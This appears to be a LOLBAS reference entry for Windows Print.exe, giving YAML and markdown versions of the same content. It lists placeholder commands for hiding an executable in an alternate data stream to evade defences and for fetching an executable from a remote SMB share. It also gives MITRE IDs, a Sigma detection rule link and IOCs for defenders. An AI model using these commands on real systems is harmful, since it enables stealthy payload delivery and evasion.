---
Acknowledgement:
- Person: Oddvar
Author: Oddvar Moe
Commands:
- Category: ADS
  Command: print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
  Description: Copy file.exe into the Alternate Data Stream (ADS) of file.txt.
  MitreID: T1564.004
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Hide binary file in alternate data stream to potentially bypass defensive
    counter measures
- Category: Copy
  Command: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
  Description: Copy file from source to destination
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Copy files
- Category: Copy
  Command: print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
  Description: Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.
  MitreID: T1105
  OperatingSystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows
    11
  Privileges: User
  Usecase: Copy/Download file from remote server
Created: 2018-05-25
Description: Used by Windows to send files to the printer
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_print_remote_file_copy.yml
- IOC: Print.exe retrieving files from internet
- IOC: Print.exe creating executable files on disk
Full_Path:
- Path: C:\Windows\System32\print.exe
- Path: C:\Windows\SysWOW64\print.exe
Name: Print.exe
Resources:
- Link: https://twitter.com/Oddvarmoe/status/985518877076541440
- Link: https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
mitre_data:
  technique_ids:
  - T1564.004
  - T1105
tags:
- lolbas/osbinaries
---

# Print.exe

Used by Windows to send files to the printer

# Path(s)

- `C:\Windows\System32\print.exe`
- `C:\Windows\SysWOW64\print.exe`

# ADS Commands

Copy file.exe into the Alternate Data Stream (ADS) of file.txt.

```batch
print /D:{PATH_ABSOLUTE}:file.exe {PATH_ABSOLUTE:.exe}
```

- **Usecase:** Hide binary file in alternate data stream to potentially bypass defensive counter measures
- **Privileges Required:** User
- **MitreID:** `T1564.004`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Copy Commands

Copy file from source to destination

```batch
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_ABSOLUTE:.source.exe}
```

- **Usecase:** Copy files
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



Copy File.exe from a network share to the target c:\OutFolder\outfile.exe.

```batch
print /D:{PATH_ABSOLUTE:.dest.exe} {PATH_SMB:.source.exe}
```

- **Usecase:** Copy/Download file from remote server
- **Privileges Required:** User
- **MitreID:** `T1105`
- **Operating System(s):** Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10, Windows 11



# Resource(s)

- https://twitter.com/Oddvarmoe/status/985518877076541440
- https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
# Acknowledgements

- Oddvar Moe (Authored, 2018-05-25)
- Oddvar